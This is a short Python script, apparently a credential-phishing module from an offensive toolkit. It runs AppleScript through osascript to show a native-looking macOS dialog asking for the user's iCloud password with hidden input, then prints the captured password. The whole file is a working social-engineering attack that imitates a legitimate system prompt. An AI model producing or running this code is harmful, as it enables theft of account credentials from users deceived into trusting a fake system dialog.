import subprocess

import sys

'''Generates native osx popup asking for user password.'''


applescript = """
set my_password to display dialog "Please enter your iCloud password:" with title "Password" with icon caution default answer "" buttons {"Cancel", "OK"} default button 2 giving up after 295 with hidden answer
set value to (text returned of my_password)
if length of value is not 0 then
	return value
else
	return my_password
end if
"""

proc = subprocess.Popen(['osascript', '-'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)

out, err = proc.communicate(applescript)
print("Error: {}".format(err[:-1]) if err else "Password: {}".format(out[:-1]))


